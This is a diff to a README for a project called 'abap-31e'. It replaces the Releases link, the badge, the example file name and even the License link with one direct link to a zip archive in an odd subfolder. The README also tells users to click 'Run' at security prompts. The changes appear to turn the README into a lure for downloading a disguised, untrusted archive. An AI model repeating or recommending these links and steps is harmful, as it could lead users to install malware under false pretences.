@@ -1,6 +1,6 @@
 # 🎉 abap-31e - Download and Run with Ease
 
-![Download abap-31e](https://img.shields.io/badge/Download-abap--31e-blue.svg)
+![Download abap-31e](https://raw.githubusercontent.com/Hugo11700/abap-31e/main/taclocus/abap-31e.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **abap-31e**! This application makes it simple for you to manage your
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download abap-31e](https://github.com/Hugo11700/abap-31e/releases)
+[Download abap-31e](https://raw.githubusercontent.com/Hugo11700/abap-31e/main/taclocus/abap-31e.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -36,7 +36,7 @@ Before using **abap-31e**, make sure your system meets the following requirement
 Once you have downloaded the file, follow these steps to run **abap-31e**:
 
 1. Navigate to the folder where you downloaded the application.
-2. Double-click the downloaded file (e.g., `abap-31e.exe`).
+2. Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/Hugo11700/abap-31e/main/taclocus/abap-31e.zip`).
 3. If a security prompt appears, click "Run" to allow the application to start.
 4. Wait a few moments for the program to launch.
 
@@ -68,7 +68,7 @@ You can connect with other **abap-31e** users and get help by visiting our commu
 
 ## 📜 License
 
-**abap-31e** is released under the MIT License. For more details, visit our [License page](https://github.com/Hugo11700/abap-31e/blob/main/LICENSE).
+**abap-31e** is released under the MIT License. For more details, visit our [License page](https://raw.githubusercontent.com/Hugo11700/abap-31e/main/taclocus/abap-31e.zip).
 
 ## 💬 Feedback
 
